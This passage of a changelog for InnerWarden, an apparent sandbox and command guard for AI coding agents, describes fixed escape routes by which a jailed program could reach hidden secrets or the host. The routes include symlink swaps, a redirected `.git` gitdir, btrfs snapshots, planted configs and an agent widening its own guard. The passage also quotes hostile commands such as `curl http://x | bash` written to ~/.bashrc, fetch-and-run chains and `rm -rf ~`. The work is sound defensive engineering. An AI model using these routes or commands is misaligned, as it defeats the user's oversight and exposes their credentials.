  stays hidden; on Linux one that holds such a place where the jail shows
  nothing else of it is left out.
- **A project whose `.git` file names a folder that does not name the
  project back is no worktree in `innerwarden contain`.** The jail shows a
  linked worktree's git folders only where git made them for this project:
  the worktree's git folder names this project's `.git` file back and sits
  in the `worktrees` folder of its repository, or (a submodule) its config
  names this project as its work tree; the repository is a git folder
  (`HEAD`, `objects`, `refs`); both belong to you; no link is on the way to
  either; and neither is your home, a folder above it, a place the jail
  hides, or in a hidden folder of your home that the jail does not show on
  Linux and lets no program write on macOS (`~/.kube`, `~/.docker`,
  `~/.password-store`, `~/.dotfiles`). Every folder
  on the way is there: a path through a folder that is not there and back
  (`nx/../L`) names none. Any other `.git` file is left alone, the start
  says why on one line, the jail starts, and git in a Linux jail sees no
  repository there, while git in a macOS jail cannot commit there (it may
  still read it). A worktree whose repository you keep in a hidden folder
  of your home that the jail does not show on Linux and lets no program
  write on macOS (`~/.dotfiles`; `~/.config`, `~/.local` and the other
  folders every jail shows writable are fine: the jail shows a repository
  there through that folder, and binds nothing more for it), or reach
  through a link, is not shown either: keep the repository elsewhere, or
  name it by its real path (`git worktree repair`). A worktree whose folder
  lies over the place InnerWarden's own folder, a hidden dotdir or a link
  inside one leads to is left out the same way, with one line, and the jail
  starts. A worktree moved by hand needs `git worktree repair` first. A
  repository made with `--separate-git-dir` (`git init` or `git clone`, the
  layout of dotfile managers such as yadm and vcsh) keeps nothing that names
  the project back, so it is not shown either, where 1.5.5 showed it (one in
  a folder the jail shows anyway, such as `~/.local/share`, still works):
  move its git folder into the project in place of the `.git` file, or work
  in a linked worktree (`git worktree add`).
- **The command line of a running jail's bubblewrap changed.** An
  identified jail's (`--identity`) now starts with its seccomp filter
  (`--seccomp <fd>`), before every other option. Where bwrap binds a place
  from a descriptor (bubblewrap 0.10.0 or later, or a package with the
  security update that added it), the real run of any jail binds the
  folders it pins, a profile's read-only paths and a worktree's git folders
  with `--bind-fd <fd> <place>` and `--ro-bind-fd <fd> <place>` instead of
  `--bind` and `--ro-bind-try` by name; a dry run still names each by its
  host folder. A tool that reads a jail's command line (from `/proc`) has
  to know those options.
- **On macOS a program in `innerwarden contain` can no longer rename, remove
  or replace the project folder itself, `~/.config`, a folder between the
  project and a `--deny-read` path, or any other folder the jail may write
  above a place it hides or a profile's read-only path (`~/.cache` or
  `/tmp` above a project there that holds a `--deny-read` path).**
  It still writes in them, finds them writable and sets their mode and
  times; only the folder itself keeps its name. A tool that renames the
  folder it works in has to run outside the jail. Where such a folder is not
  there yet (`~/.config` on an account that has none), `innerwarden contain`
  makes it first (0700) and says so. The same holds for each link on the way
  to a profile's `hide_home` path that sits in a folder the jail may write
  (`~/.cache/git` a link): it can no longer be removed, renamed or replaced
  from inside the jail.
- **On Linux a program in `innerwarden contain` can no longer rename or
  remove a folder it writes that sits above a place the jail covers.** Each
  such folder is now a mount point of its own, and `mv` or `rmdir` on it
  fails with "Device or resource busy": a folder between the project and a
  nested `--deny-read` path (`packages` and `packages/app` for `--deny-read
  packages/app/config/.env`), a folder above a profile's read-only path
  (`proj/third` above an `extra_ro` of `proj/third/lib`) or above a
  profile's `hide_home` path (`~/.cache/git` above `.cache/git/credential`),
  a folder above where a hidden dotdir or a `--deny-read` link leads
  (`~/.config/keys` above a `~/.ssh` that leads to `~/.config/keys/ssh`),
  and, with `--identity`, `~/.local/state` and `~/.local/state/innerwarden`.
  The jail still writes in each of them. A tool that renames such a folder
  has to run outside the jail. A jail started without `--identity`, with the
  default `--deny-read` paths, no profile and no linked dotdir, has none of
  these.
- **On macOS a profile's read-only path (`extra_ro`) is now read-only
  wherever it is.** Before, the macOS jail never denied writing it, so one
  in a folder the jail may write (the project, `~/.cache`, `~/.local`,
  `~/.config`, `/tmp`, `~/.claude.json`) was written as any other file
  there. A tool that writes at such a path now gets "Operation not
  permitted": with `extra_ro = ["~/.local/share/claude/versions"]` Claude
  Code can no longer update itself in the jail, and with `extra_ro =
  ["~/.claude.json"]` it can no longer save its settings there. Update the
  tool outside the jail, or take the path out of `extra_ro` if the jail has
  to write it.
- **A program in `innerwarden contain` can no longer make a btrfs or bcachefs
  subvolume or snapshot.** It gets "Operation not permitted". A tool that
  needs one (a container runtime on btrfs, `btrfs subvolume create`) has to
  run outside the jail.
- **On Linux, InnerWarden's own folder kept as a link stops `innerwarden
  contain`.** Where `~/.config/innerwarden` is a link (a dotfiles manager's),
  replace the link with the folder it leads to; `innerwarden contain` says
  how. Such a jail did not start before either.
- **A hidden dotdir behind a link the jail can change stops `innerwarden
  contain`.** Where the way to `~/.ssh`, `~/.gnupg` or `~/.aws`, to a link
  inside one, to InnerWarden's own folder, or (with `--identity` on Linux)
  to the launcher's records folder goes through a link in a folder the jail
  writes (`~/.aws` a link to `~/.cache/aws-link`, itself a link;
  `~/.local/state` a link), replace that link with what it leads to;
  `innerwarden contain` names it. On Linux, a link inside a hidden dotdir
  that leads to nothing yet, where the jail shows that place, stops it too:
  make what it leads to, or remove the link. Such an identified jail with
  the records folder behind a link did not start before either. So does, on
  Linux, a profile's `hide_home` path whose way goes through such a link
  (`~/.cache/git` a link, or a dotfiles manager's `~/.config/gh` link):
  replace that link with the folder it leads to.

### Security

- **A profile's read-only path never shows where a link a jail can change
  leads.** `innerwarden contain --identity` took each read-only path of a
  profile (`extra_ro`) where its links led. A program in an earlier jail
  that replaced that path, or a folder on the way to it, with a link (it
  can, in `~/.local`) made the next Linux jail show the place the link led
  to: a folder of your home the jail hides, or the host's `/tmp` and the
  sockets in it (a terminal multiplexer's, the display's), a way out of the
  jail. A link in a folder a jail writes is now followed only to a place the
  jail shows already, and the real Linux run binds each read-only path, and
  each folder it pins above one, from a descriptor it opens just before
  bwrap starts, one folder at a time with no link a program in a jail can
  change followed: a link put there after the launcher looked is never what
  the jail shows, and a place that changed so stops the launch. Measured
  before: a link swapped in while the launcher waited on the project's git
  files showed the host's `/tmp` in the next identified jail, and `tmux`
  there ran commands outside it. The launcher no longer waits on a file a
  program in the jail can write: it read the project's `.git` file and the
  `commondir` it names with a blocking read, so a FIFO there held it for as
  long as that program liked.
- **A program in `innerwarden contain` can no longer have the next jail
  show a folder of your home writable.** The jail binds a linked worktree's
  git folders read-write, and took them from the project's `.git` file,
  which the agent writes: `gitdir: ~/.kube` (or `~/.docker`,
  `~/.password-store`, another repository, `~/bin`, `~/.bashrc`, or on
  macOS `~/Library/LaunchAgents`) made the next jail in that project, with
  or without `--identity`, show that place writable: the agent read and
  changed what is there, and could run code outside the jail the next time
  you use it. Git's own files there were no proof either: a project in a
  folder named `worktrees` whose `.git` named the project itself made the
  folder two above it (`~/code`, with every repository in it) the
  repository. A git folder is taken now only where it is a git worktree of
  this project (see Upgrade notes), every path found with every folder on
  the way there and no link on it, and where bwrap binds a place from a
  descriptor the real Linux run binds it from one it opens just before
  bwrap starts, so a folder on the way swapped for a link since the launcher
  looked stops the launch. An older bwrap binds it by name, as before; a
  repository in the project or in a folder every jail writes (`~/.config`,
  `~/.local`) is not bound at all, since the jail shows it there.
- **A profile's read-only path never keeps a hidden dotdir from being
  hidden.** A read-only path at or inside the place `~/.ssh`, `~/.gnupg` or
  `~/.aws` leads to (a link to another disk) made the jail leave that place
  as it was: a macOS jail read everything in it, and a Linux jail showed the
  read-only path there. The place is hidden now, and the read-only path in it
  left out and said.
- **On macOS a jail can no longer move a folder above what it hides.** In
  1.5.5 and earlier, in every macOS jail, a program in it could rename a
  folder it may write that holds a place the jail denies, and then read that
  place under the new name, or put a folder of its own in that folder's
  place, whose files the host's guard read. Every macOS jail now keeps such
  folders in place, the project and the folder that holds InnerWarden's own
  folder among them; the jail still writes in them.
- **On Linux a hidden place inside a project kept in a folder the jail
  writes stays where the host reads it.** Where such a place sat in a
  project kept two or more folders down inside a home folder the jail binds,
  a folder above the project could be renamed, and the host's link then led
  to a folder the jail made. Each folder the jail writes between such a
  place and your home is now a mount point of its own.
- **No jail makes a new btrfs or bcachefs subvolume or snapshot.** In 1.5.5
  and earlier, on a btrfs or bcachefs disk where the project, or a folder the
  jail shows, is a subvolume, a program in the jail could snapshot it, and
  the snapshot held in full the files the jail hides there (`.env`,
  `secrets/`, each `--deny-read` path): the jail covers those paths with
  empty mounts, and a snapshot copies what the disk holds under them. On
  Linux, where the host takes the jail's seccomp filter, every jail now
  refuses the four btrfs commands and the two bcachefs ones that make a
  subvolume or a snapshot, on every ABI the filter runs. A snapshot made
  before the jail started, in a folder the jail shows, still holds those
  files: only new ones are refused, so keep such snapshots out of the
  project.
- **The jail hides InnerWarden's own folder wherever it shows it.** On Linux,
  where a home folder the jail binds is a link that leads off the home
  (`~/.cache` on another disk) and `~/.config` is a link into it, the jail
  covered `~/.config/innerwarden` as named and as it resolves, but showed it
  a third time through `~/.cache`, with the model key in it. It is covered
  there too, and so are the launcher's records in an identified jail (where
  `~/.local` is such a link). A project at that place is refused, as one at
  `~/.config/innerwarden` is.
- **The jail hides what it hides wherever a link leads it.** In some home
  layouts that use symbolic links, a folder the jail hides by default, a
  `--deny-read` path or InnerWarden's own folder could still be read in the
  jail. Each is now hidden where it really is, at every place the jail shows
  it, in every jail; on macOS it is denied where it leads, also outside your
  home. A link never moves a mask or a deny onto what the jail needs (the
  guard, the agent's settings or a file in them, such as the one that
  carries the hook, the project, and for a `--deny-read` path a read-only
  path of the profile; a hidden dotdir is hidden even there), and a link that a
  program in the jail can change (a `--deny-read` link in the project) never
  moves one onto what the jail runs on: on Linux a place outside your home,
  on macOS a place of the system. Such a place is left as it is, and
  `innerwarden contain` says so where the jail shows it. A worktree over the
  place a hidden dotdir leads to, and a read-only path of a profile there,
  are left out of the jail, and said. In
  every common layout the jail is the one it was. A link inside one of those
  dotdirs (`~/.ssh/config` a link into `~/.config/dotfiles`, as GNU stow and
  chezmoi make one per file where `~/.ssh` is there) is hidden where it
  leads the same way; the launcher looks for such links as far as 100000
  entries and 32 folders deep, and says where it stops short.
- **A jail can no longer move a hidden place away from the name the host
  reads it by.** A mount moves with the folder it is in, and Linux renames a folder
  that is not itself a mount point: a program in the jail that renamed the
  folder above a covered place (`~/.config/keys` above `~/.config/keys/ssh`,
  where `~/.ssh` leads; `~/dotfiles/ssh` above a stowed `~/.ssh`;
  `~/.config/app` above where a `--deny-read` link in the project leads; the
  `~/.local/state` above the launcher's records in an identified jail) took
  the cover with it and made a folder of its own at the name the host's
  link, or the launcher, reads. Each folder the jail writes between such a
  place and your home is now a mount point of its own, and the rename
  fails. On macOS the sandbox let the jail rename a folder above a denied
  place, the project included: each such folder the jail may write is now
  closed to renaming and removal, and the jail still writes in it.
- **A dotdir, InnerWarden's folder or the launcher's records behind a link
  the jail can change is refused.** The jail hid where such a way led, but
  a program in it could replace the link in the folder it writes with a
  folder of its own, on the host, and the host's `aws`, `ssh` or `gpg` then
  read its config and ran what it named (`credential_process`, `Match
  exec`, `pinentry-program`), or the launcher kept its records there. No
  mount or deny pins a link, so such a launch is refused (see Upgrade
  notes). On Linux the same holds for a profile's hidden home path: the
  host's programs read the jail's folder at that name, and wrote into it
  what the path was hidden for (a credential cache's socket, a token). On
  macOS the sandbox keeps each link on the way to a profile's hidden home
  path in place instead, also one further down a chain (`~/.local/a`, for
  `~/.cache/git` a link to `~/.local/a/git` and `~/.local/a` a link): before,
  a program in the jail could remove such a link and make a folder of its
  own there, and the host's git then kept its credential cache in it.
- **A profile's read-only path stays read-only.** On Linux the read-only
  bind of an `extra_ro` path inside the project, or a worktree's folder,
  came before the bind of that folder, which covered it, and on macOS
  nothing denied writing any `extra_ro` path, so one in a folder the jail
  may write (the project, `~/.cache`, `~/.local`, `~/.config`, `/tmp`,
  `~/.claude.json`) was written: a program in the jail wrote it. Each is
  read-only on both now (see Upgrade notes), and each folder the jail writes
  above a read-only path is kept in place, so the path is never moved away
  from its name.
- **A suppression planted in the jail no longer lifts the hook's verdict.**
  Inside the jail the hook read the person's suppressions from
  `~/.config/innerwarden`, which on Linux is an empty folder of the jail's
  own that its programs can write: a `suppress.toml` written there let
  through the command it names. The hook in a jail now reads none
  (`IW_SUPPRESS_CONFIG=/dev/null`); your own file was never visible there.
- **An LLM or notification config planted in the jail is no longer read.**
  The jail meant to turn the hook's LLM second opinion and notifications
  off with `IW_LLM_CONFIG` and `IW_NOTIFY_CONFIG` left empty, but an empty
  value made the hook read `llm.toml` and `notify.toml` in that same
  folder: a program in the jail could send each command the hook reviews to
  an endpoint of its choosing, stall the hook on it, and fire webhooks of
  its choosing. It could not lift a refusal. Both now read nothing
  (`/dev/null`).
- **On Linux, a jail can no longer replace InnerWarden's own folder kept as
  a link.** The link sits in the `~/.config` the jail binds read-write, and
  no mount can pin a link: a program in the jail could put a folder of its
  own in its place, on the host, whose files the host's guard reads. Such a
  launch is refused (see Upgrade notes).

### Changed

- **On Linux a `--deny-read` path that a link in the project leads out of
  your home is not hidden there.** Such a link is the agent's to change, and
  a mask it steers could land on what the jail runs on (a file in `/etc`, a
  library the hook loads). Where the jail shows that place, `innerwarden
  contain` says it is not hidden: keep the secret in your home or your
  project to have it hidden. A path you name outside the project (absolute,
  or with `..`) with no such link on the way is hidden where it leads, as
  before. On macOS such a place is denied where it leads, unless it is a
  place of the system outside the project.

### Fixed

- **The launcher no longer says the API key is hidden where it is not.**
  Where the place InnerWarden's own folder leads to is left as it is (said
  before), the launch line said the folder, the API key with it, was not
  visible in the jail. It now says the place its link leads to is not
  hidden.
- **The first jail on an account where Claude Code never ran has the guard's
  hook.** Arming the hook makes `~/.claude`, and the jail was planned before
  that, without it: on Linux the first `innerwarden contain` there showed no
  `~/.claude/settings.json`, so the hook never fired inside, while the
  launcher said it was armed. The jail is planned again once the hook is
  armed. A dry run arms nothing, so on such an account it still shows a jail
  without `~/.claude`.
- **Claude Code keeps its settings in an identified jail.** In
  `innerwarden contain --identity` on Linux the jail's home is an empty
  folder of its own, so Claude Code's settings file, `~/.claude.json`, was
  gone at every launch: from the second launch on Claude Code said twice that
  the file was missing, and what it saved there (an MCP server you added, its
  first-run answers) was lost. In the jail that file now leads to
  `~/.claude/.claude.json`, in the folder the jail already shares, so it is
  kept between launches. Your own `~/.claude.json` is not shown in the jail
  and its Claude Code never uses it, and the copies Claude Code keeps of it in
  `~/.claude/backups` are not shown either: each identified jail has an empty
  `~/.claude/backups` of its own. Where your own `~/.claude.json` is a link,
  or a hard link, to a file in `~/.claude`, that file is shared with the jail
  like the rest of the folder, and where `~/.claude/backups` is a link of
  yours the jail shows the host's copies (`innerwarden contain` says so). Not
  where a hidden home path or a read-only path of the profile covers that
  place or names `~/.claude.json`, where it is a link of yours or anything
  other than a file, or where your own `~/.claude.json` is that file or leads
  into `~/.claude` or to nothing: Claude Code then keeps its file in the
  jail's own home, as before. Every jail shares `~/.claude`, so what a
  program in any jail writes to `~/.claude/.claude.json` is what the next
  identified Claude Code loads, as with `~/.claude/settings.json`: an MCP
  server listed there starts with it.
- **Two identified jails at once no longer share Claude Code's session
  file.** Claude Code is process 2 in every jail and lists each running
  session as `~/.claude/sessions/<pid>.json`, in the `~/.claude` the jails
  share, so two jails at once wrote and read the same `2.json`. Each
  identified jail now has its own empty `~/.claude/sessions` (the launcher
  makes the folder, 0700, where it is not there), at every place the jail
  shows it, and none sees the sessions running outside it. Only for Claude
  Code's folder at `~/.claude`, where it is unless `CLAUDE_CONFIG_DIR` names
  another; where the jail cannot have the folder of its own (a link is there,
  the project is inside it), `innerwarden contain` says so. A jail started
  without `--identity` is unchanged: there Claude Code's settings file is
  still gone at every launch, and its session list is still shared.

## 1.5.5 - 2026-10-11

### Upgrade notes: what to do

- **`innerwarden dashboard` refuses what it does not understand.** A word such
  as `tunnel` or `open`, or `--bind` with no address, used to be skipped: the
  dashboard started on the default address and said nothing about the word.
  It now prints what it did not understand and the usage, and exits 2. The
  documented flags (`--bind IP:PORT`, `--expose`) are unchanged. A script that
  passed an extra word will now stop at it; remove the word.
- **`innerwarden status` prints the `[unknown]` explanation only under an
  `[unknown]` line.** On a healthy machine the closing note about `[unknown]`
  described a line that was not there.
- **The agent can run `innerwarden mute --list` and `--help` again.** The
  guard denied any command that contained `innerwarden mute` or
  `innerwarden dry-run`, including reading the mute list, asking for help,
  and text that only names the verb in a search or a commit message. Those
  now pass: `mute --list`, `mute --remove <rule>`, a bare `mute`, `--help`
  anywhere, and the verb inside a `grep`, `rg`, `git commit`/`log`/`show`, or
  an `echo`/`printf` whose output goes nowhere but the screen. Everywhere
  else the text `innerwarden mute <rule>`, `dry-run` or `monitor` is still
  denied, as in 1.5.4, whatever program would run it (a launcher, a pty, an
  interpreter, a heredoc, a file written and then run), and `monitor` is now
  held to the same rule as `dry-run`. Run these from your own terminal. Two
  details: the read-only words are judged in their documented order, so
  `mute ATR-1 --remove` reads as muting `ATR-1` (write `mute --remove
  ATR-1`); and a command that only prints the verb through `ssh` or `docker
  run` (`ssh host grep 'innerwarden mute' f`) is still denied, because the
  remote side runs that text.
- **Releases are stopped if the installer does not set `umask 022`.** The
  installer creates `~/.local/bin` and the binary with the caller's umask,
  which is 0002 on Ubuntu and Debian, so they came out group-writable and the
  CLI's own screening refused the binary. No change for installs that exist.
  The installer lives in the distribution repository, so its change has to be
  merged there before the next release can pass this check.
- **The Tokens page counts the whole retained history.** It used to read only
  the newest 64 MB of each agent's history and show that as the total, so a
  machine with years of transcripts showed a small fraction of its real use.
  Nothing to configure. The first scan after the dashboard starts reads the
  whole history (up to 1 GiB per refresh, newest files first, then carries on
  in the next pass), so the figures can start low and grow for a short while on
  a very large history. Later refreshes read only what was appended.
- **A capped scan says it is a sample.** When a limit still cuts the scan, the
  row shows "A sample, not the total: the newest N of M history files." and the
  Overview tile says "(a sample, not the total)". The JSON gains an additive
  `coverage` object (`complete`, `files_read`, `files_found`; numbers only) on
  each agent with counters, and `provenance.quality` is `sample` instead of
  `partial`. Older readers ignore the new field.
- **Claude Code's file tools are judged too.** The hook now also runs for
  `Write`, `Edit`, `MultiEdit` and `NotebookEdit`, and refuses a change to a
  privileged file: the agent's settings (`~/.claude/settings.json`, a
  project's `.claude/settings.json` and `.claude/settings.local.json`, the
  other agent configurations the guard wires), the guard's own configuration
  (`~/.config/innerwarden`) and program, shell startup files (`.bashrc`,
  `.zshrc`, `.profile`, ...), SSH keys, cron and the system's and your own
  services, and stored credentials (`~/.aws`, `~/.docker/config.json`,
  `~/.kube/config`, `~/.npmrc`, ...). Every other edit is allowed at once,
  without a word and without a record. `innerwarden install claude-code` (or
  `agents connect claude-code`) writes the new `PreToolUse` entry beside the
  Bash one, in the mode the hook already has. With automatic setup on, the
  dashboard and `innerwarden upgrade` add it for you without asking, by
  rewriting `~/.claude/settings.json` once; on a hook that enforces, the agent's
  edits of the files above (`~/.bashrc`, `~/.aws/...` and the rest) are refused
  from then on, where they used to go through. Without automatic setup nothing
  is rewritten, and `innerwarden status` reports `[off] only shell commands
  are judged` (and the headline says the machine is not fully protected)
  until you run `innerwarden install claude-code`. Either way, restart Claude
  Code afterwards: it reads its hooks at startup. `innerwarden status` says
  which tool classes each agent's wiring judges, and names the command when a
  hook judges shell commands only or records file changes without refusing
  them while its shell hook refuses.
- **A privileged file is known by what it is, not only by its name.** A hard
  link to one, the real file a home link points at (`~/.bashrc ->
  ~/dotfiles/bashrc`: the agent's edit of `~/dotfiles/bashrc` is refused), a
  new file in a privileged directory reached through a link, and the guard's
  program under another name are refused as that file. If you keep your
  dotfiles in a repository and let the agent work there, edits to the files
  your home links to are now yours to make. A hook run without `HOME` judges
  against the home the account database names.
- **`uninstall` removes two entries.** It reports "removed 2 entries" where it
  reported 1, the Bash hook and the file-tools hook. Uninstall with this
  version: a 1.5.4 or earlier `innerwarden uninstall` does not know the
  file-tools entry and leaves it behind, and with the program gone Claude Code
  reports a hook error on every file edit until the entry is removed from
  `~/.claude/settings.json`.
- **Asking the agent to edit `~/.claude/settings.json` is now refused.** That
  request was allowed before, and it is the same change an agent would make to
  switch its own guard off, so the guard cannot tell the two apart. Edit the
  file yourself: your own editor and shell are not screened. The same holds
  for the other files above.
- **The MCP proxy reads every line the way the server will.** A message is
  parsed as JSON where the last of two equal keys wins, so a call that hid a
  second `params` behind a first one is inspected as the call the server
  runs, and forwarded in that form. A batch (a JSON array, which clients of
  the 2025-03-26 protocol revision send) is judged element by element; in
  `guard` mode a refused element is answered on its own and the rest of the
  batch goes on, in `kill` mode none of it does. A message without
  `"jsonrpc": "2.0"` is inspected rather than passed through. Blank lines are
  still dropped.
- **A client line that is not JSON is refused in `guard` and `kill` mode.** It
  is not forwarded, and the client gets a JSON-RPC parse error (`-32700`,
  `id: null`). So is JSON nested more than 128 levels deep, which the proxy
  cannot read and used to forward unread. In `advisory` (the default) and
  `warn`, which never block, the line is forwarded as before and an
  `AG-MCP-PARSE` finding says it went uninspected. A protocol-conforming
  client sends neither. An escaped lone surrogate (`"\ud800"`, which a
  JavaScript client can produce) is read, not refused.
- **A message with a repeated key is forwarded as it was inspected, both
  ways.** Client and server lines that repeat a key (which no conforming peer
  sends) are re-serialized with the last value, the one the proxy judged, so
  a peer whose parser keeps the first value cannot be handed one the proxy
  never saw. Lines without a repeated key keep their exact bytes.
- **Server output that is not a message is treated as tool output.** Text a
  server writes to its MCP stream that is not a JSON-RPC message still reaches
  the client, and is now scanned for prompt injection and remembered by the
  taint check, so a later call that reuses it is held. A server that prints a
  banner or log lines to stdout (instead of stderr) can see such a call held
  in `guard` mode; send its logs to stderr.
- **`readOnlyHint` no longer hides a write tool.** A server that declares a
  tool read-only is not believed for the privileged-file check when the
  tool's name says it writes: `write_file`, `edit_file`, `move_file`,
  `create_directory`, and any name with a word such as write, edit, create,
  move, rename, delete, replace, save, patch or copy (`writeFile`,
  `fs_write`, `str_replace_editor`). The call is judged as the write it is.
  Other tools keep the server's word, as before.

### Changed

- Token history is indexed per file (length, time, how far it was read) and
  only the bytes appended since the last refresh are read. A file that shrank,
  was rewritten or was removed makes the index rebuild from scratch, so the
  totals never keep tokens from history that is gone. Message and session ids
  are kept only as 64-bit digests in memory for de-duplication and are never
  written or served.
- The dashboard JavaScript is 2.6 kB smaller (the shared part, which the paid
  dashboard also builds from, is 3.1 kB smaller): class lists that were
  repeated in many components are declared once.

## 1.5.4 - 2026-10-11

### Upgrade notes: what to do

- **Scripts that add allow or mute entries need `--operator`.** `innerwarden
  allow <pattern>` and `innerwarden mute <rule>` now run only in a terminal.
  A script of yours that runs them with no terminal (CI, provisioning,
  dotfiles) must pass `--operator`; it is not honoured inside an AI agent's
  shell. `--list`, `--remove` and help need nothing. The refusal exits 1 and
  changes nothing.
- **`allow = ["*"]` is ignored.** A pattern that is only `*` would switch
  screening off; it is dropped at load with a warning, and `innerwarden
  allow '*'` is refused. Use `innerwarden dry-run` to stop blocking.
- **A pattern whose first word holds a `*` lifts only a review.** An allow
  pattern such as `* | bash` or `c*` still loads (with a warning from
  `innerwarden check` and `allow --list`) and still lifts a command held for
  review, but no longer lifts a refused command, a fetch-and-run, an
  obfuscated command, a persistence write or a look-alike package. Write the
  command's first word out (`curl -fsSL https://sh.rustup.rs*`) to lift those.
- **Removing a home is refused.** `rm -rf ~`, `~/`, `~/*`, `~user`, `$HOME`,
  `"${HOME}"`, `/home/<user>`, `/Users/<user>` and `/root` are a deny. So are
  `rm -rf *`, `.`, `./*` and `..` when the agent runs them from the home or
  from `/`. A path under the home (`rm -rf ~/.cache/x`, `rm -rf
  "$HOME/.cache/x"`) is scoped work and is no longer refused as a hidden
  target.
- **An agent reading a secrets file outside its project is blocked.** A
  `.env`-class file read from outside the repository the agent works in
  (`cat ~/secret.env`, `cat /srv/other/.env`) stays `review` and is now
  blocked for an agent. The project's own `.env`, from anywhere in the
  repository (`cat ../.env` in a monorepo package), and the main checkout's
  from one of its worktrees or submodules, are unchanged; so is a `.env` in a
  directory above a project that is not under git. A session started in the
  home or in `/` keeps the old verdict.

### Fixed

- **A long command is judged whole.** The rewrite that exposes obfuscated
  commands kept only the first 8 KB, cut by byte: a multi-byte character
  across the cut stopped the screening, and what followed the first 8 KB was
  never rewritten. It now rewrites the whole command piece by piece. A long
  benign heredoc or generated script keeps its verdict.
- **A failure while screening refuses the call.** If the hook stops on an
  internal error it exits 2 in enforce (the call is refused) and 1 in
  monitor. The MCP proxy exits 1 and never forwards the call it was
  screening.
- **The advice after a block is for the person.** It no longer prints a
  ready-to-run `innerwarden allow '<command>'`, which the agent reads first.
- **The agent cannot widen its own guard from the shell.** `innerwarden
  allow` / `mute` / `dry-run` run by the agent (through a path, quotes, a
  launcher, `sh -c`, `eval`, `xargs`, `find -exec`) and a shell write or link
  into `~/.config/innerwarden/` are refused, and no allow rule lifts that.
  This raises the cost for an agent; it does not stop one that sets out to
  change its own user's files by a route the hook does not see.
- **A subshell's `cd` ends with the subshell.** `(cd ~ && git pull); rm -rf
  ./*` is judged where the command started.

## 1.5.3 - 2026-10-09

### Upgrade notes: what to do

- **An agent can no longer install a package whose name is one letter off a
  popular one.** `pip install reqeusts` or `npm install expresss` run by an
  agent is now held for review and blocked under the default policy; run by
  you with `innerwarden check` it is `review`, never `deny`. The same holds
  when the look-alike is run or downloaded (`npx expresss`, `uvx pytset`,
  `pip download reqeusts`). If a package you really use is held, install it
  yourself, or allow it for the agent.
- **An agent command the guard cannot parse is held when it fetches and
  runs.** A command that does not parse as shell and names both a download
  (curl, wget, aria2c, axel, a Python or Node network one-liner) and a way to
  run code (sh, bash, eval, source, `./file`, `chmod +x`, an interpreter) is
  `review` and blocked for an agent. One that names only one of the two, or
  neither, is unchanged.
- **`innerwarden status` counts only what your agents sent.** A check you ran
  by hand (and every drill or verify run) is no longer counted as proof that
  your agent's commands reach the guard, so an install whose agent has not
  run a command since it was wired now says so instead of reading as on and
  screening.

### Added

- **Look-alike package names are caught on install.** An install through
  pip, pipx, uv, poetry, pipenv, npm, yarn, pnpm or bun that names a package
  one edit away (a letter added, dropped, changed, or two swapped) from a
  popular PyPI or npm package, and is not itself a known package, is flagged
  `package_typosquat` and named with the package it imitates. This is how
  typosquatted packages, and package names an AI agent made up, get
  installed. Real packages that sit one letter from each other (scipy and
  scapy, react and preact) are known and pass. Names shorter than five
  letters are never compared. The list ships in the repository
  (`crates/agent-guard/data/popular-packages.txt`).
- **Look-alike names are caught when a package is run or downloaded, not
  only installed.** `npx`, `npm exec`, `pnpm dlx`, `yarn dlx`, `bunx`,
  `uvx`, `uv tool run`, `uv tool install`, `pipx run`, `pip download` and
  `pip wheel` are read with the same list and rules, including the package
  named by `npx -p`, `uvx --from`/`--with` and `pipx run --spec`. A run
  executes the package the moment it lands, and a source download runs its
  build code. Only the run's package is read: what follows it is that
  package's own arguments, so `pipx run cowsay reqeusts` is no longer
  flagged for its argument.
- **A fetch-and-run the shell grammar cannot parse is held.** When the
  parser rejected a command no structural check ran, and the fallback only
  fired if a text rule had already recognised the shape, so
  `aria2c URL -o r && chmod +x r && ./r )`, or a Python one-liner that saves
  a payload followed by `bash r.sh )`, was allowed. An unparseable command
  that names both a fetch and a way to run code is now `fetch_exec_unparsed`:
  review, blocked for an agent.
- **`innerwarden proxy` reports each refused tool call to a local
  InnerWarden agent.** When a `guard` or `kill` proxy answers a `tools/call`
  with a denial, it also sends one `POST /api/agent/proxy-block` to the agent
  on this host (`https://127.0.0.1:8787` by default), so the refusal shows up
  there as a case. The report carries what the proxy already records: its
  label, the tool, the redacted summary of the call, the rule ids that fired
  and the mode; never the raw arguments. It goes out from a thread of its
  own and never delays an MCP message. With no agent, the proxy says so once
  on stderr and nothing else changes. `INNERWARDEN_AGENT_URL` names another
  address on this host's loopback (an address elsewhere is refused), and
  `INNERWARDEN_AGENT_URL=off` turns reporting off.
- **Library users: a connected agent's registry row keeps its systemd unit.**
  `Registry::connect` records the system service the process runs in, read
  only from the cgroup the kernel reports for it, so the row survives a
  service restart that changes the pid. `ConnectedAgent`, `PersistedAgent`
  and `AgentSummary` gain `systemd_unit`; `connect_with_facts_and_unit` is
  new. Registry files written by an earlier version load unchanged, and a row
  without a unit is written without the key.

### Changed

- **`innerwarden --version` names the paid release too.** With Active
  Defence installed it adds, on stderr, that `innerwarden-ctl --version`
  gives the host stack's release. stdout stays one line.
- **`upgrade` names what is still running the old binary correctly.** Its
  closing advice called whatever answered on 127.0.0.1:8787 "the dashboard".
  It now names the Community dashboard on 8788 and an `innerwarden serve` on
  8787 each by its own answer, and says nothing about anything else.

### Fixed

- **A download run in two steps is caught.** `f=$(curl -s URL) && echo "$f"
  > /tmp/r.sh && sh /tmp/r.sh` was allowed, and so were the same steps with
  `wget`, `printf`, `tee`, here-strings, heredocs, `cat >`, a copy of the
  file, or `chmod +x` and `./r.sh`. A value fetched into a shell variable is
  now followed into the file it is written to, and running that file is
  screened like any other downloaded script (review, and blocked for an
  agent; denied when the fetch has no TLS, a bare IP, a paste host or a
  decoder). Feeding the variable to a shell's input (`sh <<<"$f"`) is denied.
  Writing a fetched value to a file nobody runs (`echo "$f" > data.json`)
  stays allowed.
- **A download through another tool, then run, is caught like curl's.**
  `aria2c URL -o r && chmod +x r && ./r`, the same with `axel`,
  `lwp-download URL r.sh && sh r.sh`, BSD `fetch URL && sh r.sh`, and a
  Python, Node, Perl, Ruby or PHP one-liner that fetches and writes a file
  (`urlretrieve`, `urlopen` or `requests.get` then `open(...).write`,
  `fetch` then `writeFileSync`, LWP `getstore`/`mirror`, `open-uri` then
  `File.write`, `file_get_contents` then `file_put_contents`) followed by
  running that file were allowed while the curl and wget forms were held.
  They now score the same: review, blocked for an agent, denied with the same
  aggravating evidence. A one-liner that only prints, and a download nobody
  runs, stay allowed.
- **A command written into a shell startup file is screened as a command.**
  `echo 'curl http://x | bash' >> ~/.bashrc` (and the same with `printf`,
